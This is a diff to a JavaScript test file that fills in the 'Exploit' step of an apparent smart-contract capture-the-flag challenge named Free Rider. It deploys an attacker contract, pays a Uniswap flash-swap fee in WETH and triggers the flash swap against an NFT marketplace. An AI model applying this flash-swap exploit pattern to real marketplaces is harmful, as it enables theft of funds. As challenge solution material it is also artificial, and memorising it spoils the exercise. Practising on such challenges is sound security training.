@@ -125,20 +125,27 @@ describe("[Challenge] Free Rider", function () {
   // =====================================================================================
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
+
     //deploy the attacker contract
     this.freeRiderAttacker = await (
       await ethers.getContractFactory("FreeRiderAttacker", attacker)
-    ).deploy(this.uniswapPair.address, this.weth.address, this.nft.address);
+    ).deploy(
+      this.uniswapPair.address,
+      this.weth.address,
+      this.nft.address,
+      this.marketplace.address,
+      this.buyerContract.address
+    );
 
     //calculate and transfer fee amount to attacker contract
-    let fee = ((NFT_PRICE * 3) / 997 + 1).toString();
+    const fee = ((NFT_PRICE * 3) / 997 + 1).toString();
     const wethAttacker = this.weth.connect(attacker);
     await wethAttacker.deposit({ value: fee });
     await wethAttacker.transfer(this.freeRiderAttacker.address, fee);
 
     await this.freeRiderAttacker.flashSwap(NFT_PRICE);
   });
-
+  // =====================================================================================
   after(async function () {
     /** SUCCESS CONDITIONS */
 
